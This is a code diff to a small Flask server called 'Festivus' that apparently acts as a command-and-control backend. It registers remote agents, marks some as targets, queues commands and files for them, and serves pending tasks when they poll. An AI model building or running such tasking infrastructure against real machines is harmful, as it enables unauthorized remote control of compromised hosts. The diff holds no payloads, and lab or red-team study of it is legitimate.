@@ -14,11 +14,14 @@ class Agent(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     agent_id = db.Column(db.String(100), unique=True, nullable=False)
     status = db.Column(db.String(20), default='active')
+    targeted = db.Column(db.Boolean,default=False)
 
 class Task(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     agent_id = db.Column(db.String(100), db.ForeignKey('agent.agent_id'), nullable=False)
-    command = db.Column(db.String(500), nullable=False)
+    action = db.Column(db.String(500), nullable=False)
+    command = db.Column(db.String(500), nullable=True,default="NULL")
+    filename = db.Column(db.String(100), nullable=True,default="NULL")
     completed = db.Column(db.Boolean, default=False)
 
 # Initialize database
@@ -36,7 +39,10 @@ def register_agent():
             db.session.add(new_agent)
             db.session.commit()
             return jsonify({"message": "Agent registered successfully"}), 201
-        return jsonify({"message": "Agent already registered"}), 200
+        else:
+            agent.status = 'active'
+            db.session.commit()
+            return jsonify({"message": "Agent registration renewed"}), 200
     return jsonify({"error": "Invalid data"}), 400
 
 @app.route('/get-agents', methods=['GET'])
@@ -49,7 +55,12 @@ def get_agents():
 
 @app.route('/targets', methods=['GET'])
 def get_targets():
-    return "127.0.0.1,192.168.1.158"
+    targets = ""
+    agents = Agent.query.all()
+    for agent in agents:
+        if agent.targeted == True:
+            targets += agent.agent_id + "\n"
+    return targets
 
 @app.route('/results', methods=['POST'])
 def submit_results():
@@ -79,11 +90,26 @@ def heartbeat():
 
 @app.route('/tasks', methods=['GET'])
 def get_task():
-    pass
+    agent_id = request.args.get('agent_id')
+    if agent_id:
+        task = Task.query.filter_by(agent_id=agent_id, completed=False).first()
+        if task:
+            task_data = {
+                'action': task.command,
+                'task_id': task.id
+            }
+            return jsonify(task_data)
+    return jsonify({'command': 'NULL'})
 
 @app.route('/', methods=['GET'])
 def homepage():
-    return "<h1>Festivus</h1><p>It's a Festivus for the rest of us!</p>"
+    webpage_content = """
+    <h1>Welcome to Festivus</h1>
+    <h3>Agents:</h3>
+    """
+    for agent in Agent.query.all():
+        webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
+    return webpage_content
 
 
 
